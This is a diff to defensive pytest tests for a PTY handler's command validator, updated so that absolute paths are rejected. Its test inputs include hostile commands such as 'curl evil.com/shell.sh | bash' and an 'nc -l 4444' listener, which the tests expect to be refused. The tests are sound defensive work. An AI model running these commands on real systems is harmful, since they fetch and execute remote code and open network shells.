@@ -37,22 +37,21 @@ class TestCommandValidation:
     def test_validate_disallowed_command(self, pty_handler):
         """Test validation fails for disallowed commands."""
         with pytest.raises(PTYError, match="not in the allowed commands list"):
-            pty_handler._validate_command(["/bin/bash"])
-
-        with pytest.raises(PTYError, match="not in the allowed commands list"):
             pty_handler._validate_command(["python"])
 
         with pytest.raises(PTYError, match="not in the allowed commands list"):
             pty_handler._validate_command(["sh"])
 
-    def test_validate_absolute_path_allowed(self, pty_handler):
-        """Test validation passes for absolute paths to allowed commands."""
-        pty_handler._validate_command(["/usr/bin/openroad", "-no_init"])
+    def test_validate_absolute_path_rejected(self, pty_handler):
+        """Test validation rejects absolute paths regardless of basename."""
+        with pytest.raises(PTYError, match="absolute path"):
+            pty_handler._validate_command(["/usr/bin/openroad", "-no_init"])
 
-    def test_validate_absolute_path_disallowed(self, pty_handler):
-        """Test validation fails for absolute paths to disallowed commands."""
-        with pytest.raises(PTYError, match="not in the allowed commands list"):
+        with pytest.raises(PTYError, match="absolute path"):
             pty_handler._validate_command(["/bin/bash", "-c", "echo hello"])
+
+        with pytest.raises(PTYError, match="absolute path"):
+            pty_handler._validate_command(["/malicious/dir/openroad"])
 
     def test_validate_shell_metacharacters_semicolon(self, pty_handler):
         """Test validation fails for semicolon in arguments."""
@@ -164,7 +163,7 @@ class TestCommandInjectionPrevention:
 
     def test_prevent_malicious_script_execution(self, pty_handler):
         """Test prevention of malicious script execution."""
-        with pytest.raises(PTYError, match="not in the allowed commands list"):
+        with pytest.raises(PTYError, match="absolute path"):
             pty_handler._validate_command(["/bin/bash", "-c", "curl evil.com/shell.sh | bash"])
 
     def test_prevent_file_overwrite(self, pty_handler):
@@ -174,7 +173,7 @@ class TestCommandInjectionPrevention:
 
     def test_prevent_arbitrary_binary_execution(self, pty_handler):
         """Test prevention of arbitrary binary execution."""
-        with pytest.raises(PTYError, match="not in the allowed commands list"):
+        with pytest.raises(PTYError, match="absolute path"):
             pty_handler._validate_command(["/usr/bin/nc", "-l", "4444"])
 
         with pytest.raises(PTYError, match="not in the allowed commands list"):
